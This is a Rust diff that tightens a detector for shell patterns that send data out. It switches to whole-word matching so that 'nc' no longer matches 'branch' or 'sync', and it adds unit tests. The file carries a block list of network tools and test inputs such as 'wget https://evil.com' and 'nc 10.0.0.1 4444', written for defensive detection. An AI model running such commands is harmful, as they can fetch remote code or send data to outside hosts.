@@ -120,7 +120,6 @@ pub fn is_exfil_bash_pattern(pattern: &str) -> bool {
     let exfil_commands = [
         "curl",
         "wget",
-        "nc",
         "ncat",
         "ssh",
         "scp",
@@ -129,7 +128,21 @@ pub fn is_exfil_bash_pattern(pattern: &str) -> bool {
         "git remote",
     ];
     let lower = pattern.to_lowercase();
-    exfil_commands.iter().any(|cmd| lower.contains(cmd))
+    exfil_commands.iter().any(|cmd| {
+        // Word-boundary match: the command must appear as a standalone word,
+        // not as a substring of another word (e.g. "nc" in "branch")
+        if let Some(pos) = lower.find(cmd) {
+            let before_ok = pos == 0 || !lower.as_bytes()[pos - 1].is_ascii_alphanumeric();
+            let after_pos = pos + cmd.len();
+            let after_ok =
+                after_pos >= lower.len() || !lower.as_bytes()[after_pos].is_ascii_alphanumeric();
+            before_ok && after_ok
+        } else {
+            false
+        }
+    })
+    // Special case: standalone "nc" (netcat) — must be first token or after whitespace
+    || lower.split_whitespace().any(|word| word == "nc")
 }
 
 /// Check if a read pattern targets known sensitive paths.
@@ -204,8 +217,13 @@ mod tests {
         assert!(is_exfil_bash_pattern("curl *"));
         assert!(is_exfil_bash_pattern("wget https://evil.com"));
         assert!(is_exfil_bash_pattern("git push *"));
+        assert!(is_exfil_bash_pattern("nc 10.0.0.1 4444"));
+        assert!(is_exfil_bash_pattern("ssh user@host"));
         assert!(!is_exfil_bash_pattern("cargo test"));
         assert!(!is_exfil_bash_pattern("npm run *"));
+        // "nc" must not match as substring of "branch", "sync", etc.
+        assert!(!is_exfil_bash_pattern("git branch *"));
+        assert!(!is_exfil_bash_pattern("sync data"));
     }
 
     #[test]
